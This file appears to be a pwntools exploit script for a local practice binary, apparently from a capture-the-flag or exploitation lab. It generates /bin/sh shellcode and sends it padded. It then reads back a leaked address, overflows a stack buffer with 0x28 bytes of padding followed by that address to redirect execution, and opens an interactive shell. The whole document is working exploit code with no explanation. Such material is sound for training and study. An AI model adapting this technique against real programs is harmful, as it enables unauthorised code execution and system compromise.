from pwn import *


binary = "../x86_binaries/x86_no_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
shellcode = asm(shellcraft.sh())

# send shellcode + padding
p.send(shellcode+b'a'*(0x100-len(shellcode)))

shellcode_addr = int(p.readline().strip(),16)
print(f'shellcode(): {hex(shellcode_addr)}')

payload = flat(
    b'a'*0x28,
    p64(shellcode_addr)
)
p.sendline(payload)
p.interactive()